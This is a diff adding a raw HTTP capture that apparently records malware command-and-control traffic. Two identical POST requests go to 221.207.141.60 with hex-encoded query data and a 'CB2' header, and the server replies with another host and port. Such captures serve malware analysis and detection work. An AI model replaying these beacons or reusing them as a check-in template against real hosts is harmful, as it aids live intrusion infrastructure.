@@ -1,0 +1,29 @@
+POST /?a4faf5fef2e1b7faf5f6f1f6f6e1b2faf5f4fee1b1faf4f3f5f2e1a5faf5f5f2f5f0f1f6e1a3faf6e1b4faf6f1fff5f2f7f7e1a2fa84fd9b908e89838890949b93828a979bb1b4a0b6f0f0b6b0e9a2bfa2e1a0faaea9aeb3c7 HTTP/1.1
+Accept: */*
+Accept-Language: en-us
+CB2: 1
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla
+Host: 221.207.141.60
+Connection: Keep-Alive
+
+
+POST /?a4faf5fef2e1b7faf5f6f1f6f6e1b2faf5f4fee1b1faf4f3f5f2e1a5faf5f5f2f5f0f1f6e1a3faf6e1b4faf6f1fff5f2f7f7e1a2fa84fd9b908e89838890949b93828a979bb1b4a0b6f0f0b6b0e9a2bfa2e1a0faaea9aeb3c7 HTTP/1.1
+Accept: */*
+Accept-Language: en-us
+CB2: 1
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla
+Host: 221.207.141.60
+Connection: Keep-Alive
+
+
+HTTP/1.1 200 OK
+Date: Mon, 15 Aug 2011 16:12:22 GMT
+Server: Apache/2.2.8 (Fedora) DAV/2 PHP/5.2.6 mod_ssl/2.2.8 OpenSSL/0.9.8g
+X-Powered-By: PHP/5.2.6
+Content-Length: 26
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+CB2=212.117.171.138:65500
